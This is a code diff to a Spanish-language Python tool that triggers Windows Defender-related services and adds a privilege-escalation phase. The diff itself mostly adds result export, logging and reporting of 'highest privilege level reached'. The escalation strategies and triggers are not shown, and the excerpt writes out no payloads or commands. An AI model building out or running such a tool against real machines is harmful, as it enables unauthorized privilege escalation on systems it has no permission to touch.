+    def exportar_resultados_escalada(self, formato: str = "json") -> str:
+        """Exporta resultados de escalada"""
+        if formato == "json":
+            datos = {
+                "sesion_escalada": {
+                    "inicio": self._resultados[0].timestamp if self._resultados else None,
+                    "fin": datetime.now().isoformat(),
+                    "resumen": self.obtener_resumen_escalada(),
+                    "entorno": ENTORNO
+                },
+                "estrategias": [r.to_dict() for r in self._resultados]
+            }
+            return json.dumps(datos, indent=2, ensure_ascii=False)
+        
+        elif formato == "txt":
+            lineas = ["=" * 80, "REPORTE DE ESCALADA DE PRIVILEGIOS", "=" * 80]
+            resumen = self.obtener_resumen_escalada()
+            
+            lineas.append(f"\nEntorno: {ENTORNO}")
+            lineas.append(f"Exitosas: {resumen['exitosas']}/{resumen['total']}")
+            lineas.append(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
+            lineas.append(f"Nivel máximo alcanzado: {resumen['nivel_maximo'].upper()}\n")
+            
+            for r in self._resultados:
+                estado = "✓" if r.exito else "✗"
+                lineas.append(f"\n[{estado}] {r.estrategia}")
+                lineas.append(f"    Mensaje: {r.mensaje}")
+                lineas.append(f"    Nivel: {r.nivel_privilegio}")
+                lineas.append(f"    Duración: {r.duracion_ms:.2f}ms")
+                if r.excepcion:
+                    lineas.append(f"    Error: {r.excepcion}")
+            
+            return "\n".join(lineas)
+        
+        return ""
 
 
 # ========== IMPLEMENTACIONES DE TRIGGERS ==========
@@ -702,9 +1177,9 @@ class DispatcherServicios:
     
     def validar_estado(self) -> bool:
         """Valida que el entorno sea correcto antes de ejecutar"""
-        logger.info("=" * 70)
+        logger.info("=" * 80)
         logger.info("VALIDACION DE ENTORNO")
-        logger.info("=" * 70)
+        logger.info("=" * 80)
         logger.info(f"[*] Entorno detectado: {ENTORNO}")
         logger.info(f"[*] Ruta de logs: {LOG_DIR}")
         logger.info(f"[*] Archivo destino: {ARCHIVO_DESTINO}")
@@ -718,7 +1193,7 @@ class DispatcherServicios:
             return False
         
         logger.info("[+] Entorno validado correctamente")
-        logger.info("=" * 70)
+        logger.info("=" * 80)
         return True
     
     def trigger(self, servicio: ServicioObjetivo) -> ResultadoTrigger:
@@ -780,7 +1255,7 @@ class DispatcherServicios:
         }
     
     def exportar_resultados(self, formato: str = "json") -> str:
-        """Exporta resultados en formato especificado"""
+        """Exporta resultados en formato especificado con detalles de intentos"""
         if formato == "json":
             datos = {
                 "sesion": {
@@ -794,15 +1269,15 @@ class DispatcherServicios:
             return json.dumps(datos, indent=2, ensure_ascii=False)
         
         elif formato == "csv":
-            lineas = ["servicio,exito,mensaje,duracion_ms,intentos"]
+            lineas = ["servicio,exito,mensaje,duracion_ms,intentos,codigo_retorno"]
             for r in self._resultados:
                 lineas.append(
-                    f'"{r.servicio}",{r.exito},"{r.mensaje}",{r.duracion_ms},{r.intentos}'
+                    f'"{r.servicio}",{r.exito},"{r.mensaje}",{r.duracion_ms},{r.intentos},{r.codigo_retorno}'
                 )
             return "\n".join(lineas)
         
         elif formato == "txt":
-            lineas = ["=" * 70, "REPORTE DE EJECUCION", "=" * 70]
+            lineas = ["=" * 80, "REPORTE DETALLADO DE EJECUCION", "=" * 80]
             lineas.append(f"Entorno: {ENTORNO}\n")
             resumen = self.obtener_resumen()
             lineas.append(f"Exitosas: {resumen['exitosas']}/{resumen['total']}")
@@ -810,9 +1285,27 @@ class DispatcherServicios:
             lineas.append(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms\n")
             
             for r in self._resultados:
-                estado = "+" if r.exito else "x"
-                lineas.append(f"[{estado}] {r.servicio}: {r.mensaje}")
-                lineas.append(f"  L- {r.duracion_ms:.2f}ms ({r.intentos} intento(s))")
+                estado = "✓" if r.exito else "✗"
+                lineas.append(f"\n[{estado}] SERVICIO: {r.servicio}")
+                lineas.append(f"    Estado: {'EXITOSO' if r.exito else 'FALLIDO'}")
+                lineas.append(f"    Mensaje: {r.mensaje}")
+                lineas.append(f"    Código retorno: {r.codigo_retorno}")
+                lineas.append(f"    Duracion total: {r.duracion_ms:.2f}ms")
+                lineas.append(f"    Intentos: {r.intentos}")
+                
+                if r.stdout:
+                    lineas.append(f"    Respuesta STDOUT: {r.stdout[:150]}...")
+                if r.stderr:
+                    lineas.append(f"    Error STDERR: {r.stderr[:150]}...")
+                
+                if r.intentos_detalles:
+                    lineas.append(f"    DETALLES DE INTENTOS:")
+                    for det in r.intentos_detalles:
+                        lineas.append(f"      └─ Intento {det['numero']}: {det['estado']} ({det['duracion_ms']:.2f}ms)")
+                        if det['respuesta']:
+                            lineas.append(f"         Respuesta: {det['respuesta'][:100]}")
+                        if det['codigo_retorno'] is not None:
+                            lineas.append(f"         Código: {det['codigo_retorno']}")
             
             return "\n".join(lineas)
         
@@ -842,6 +1335,11 @@ def main():
         if DRY_RUN:
             logger.warning("[!] Ejecutandose en modo DRY-RUN - No se realizaran cambios reales")
         
+        # ========== FASE 1: DISPAROS DE SERVICIOS ==========
+        logger.info("\n\n" + "╔" + "═" * 78 + "╗")
+        logger.info("║" + " FASE 1: DISPAROS DE SERVICIOS WINDOWS ".center(78) + "║")
+        logger.info("╚" + "═" * 78 + "╝\n")
+        
         servicios = [
             ServicioObjetivo.DEFENDER_SCAN,
             ServicioObjetivo.DEFENDER_UPDATE,
@@ -850,29 +1348,50 @@ def main():
             ServicioObjetivo.BLUEHAMMER
         ]
         
-        logger.info("\n" + "=" * 70)
-        logger.info("INICIANDO DISPAROS DE SERVICIOS")
-        logger.info("=" * 70)
-        
         resultados = dispatcher.trigger_multiples(servicios)
         
-        logger.info("\n" + "=" * 70)
-        logger.info("RESUMEN DE EJECUCION")
-        logger.info("=" * 70)
+        logger.info("\n" + "=" * 80)
+        logger.info("RESUMEN FASE 1 - DISPAROS DE SERVICIOS")
+        logger.info("=" * 80)
         resumen = dispatcher.obtener_resumen()
         logger.info(f"Total de servicios: {resumen['total']}")
         logger.info(f"Exitosos: {resumen['exitosas']}")
         logger.info(f"Fallidos: {resumen['fallidas']}")
         logger.info(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
         logger.info(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms")
-        logger.info("=" * 70)
+        logger.info("=" * 80)
         
+        # ========== FASE 2: ESCALADA DE PRIVILEGIOS ==========
+        escalador = EscaladaDePrivilegios()
+        resultados_escalada = escalador.ejecutar_todas_estrategias()
+        
+        logger.info("\n" + "=" * 80)
+        logger.info("RESUMEN FASE 2 - ESCALADA DE PRIVILEGIOS")
+        logger.info("=" * 80)
+        resumen_escalada = escalador.obtener_resumen_escalada()
+        logger.info(f"Total estrategias: {resumen_escalada['total']}")
+        logger.info(f"Exitosas: {resumen_escalada['exitosas']}")
+        logger.info(f"Fallidas: {resumen_escalada['fallidas']}")
+        logger.info(f"Tasa de exito: {resumen_escalada['tasa_exito']:.2f}%")
+        logger.info(f"Nivel máximo alcanzado: {resumen_escalada['nivel_maximo'].upper()}")
+        logger.info("=" * 80)
+        
+        # ========== EXPORTAR RESULTADOS ==========
         logger.info("\n[*] Exportando resultados...")
         dispatcher.guardar_reporte()
         
-        print("\n" + dispatcher.exportar_resultados("txt"))
+        # Guardar reporte de escalada
+        nombre_escalada = LOG_DIR / f"reporte_escalada_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        ruta_escalada = Path(nombre_escalada)
+        contenido_escalada = escalador.exportar_resultados_escalada("json")
+        ruta_escalada.write_text(contenido_escalada, encoding="utf-8")
+        logger.info(f"[+] Reporte de escalada guardado en: {ruta_escalada}")
         
-        return 0 if resumen['exitosas'] > 0 else 1
+        # Mostrar reportes finales
+        print("\n" + dispatcher.exportar_resultados("txt"))
+        print("\n" + escalador.exportar_resultados_escalada("txt"))
+        
+        return 0 if (resumen['exitosas'] > 0 or resumen_escalada['exitosas'] > 0) else 1
     
     except KeyboardInterrupt:
         logger.warning("\n[!] Ejecucion interrumpida por el usuario")
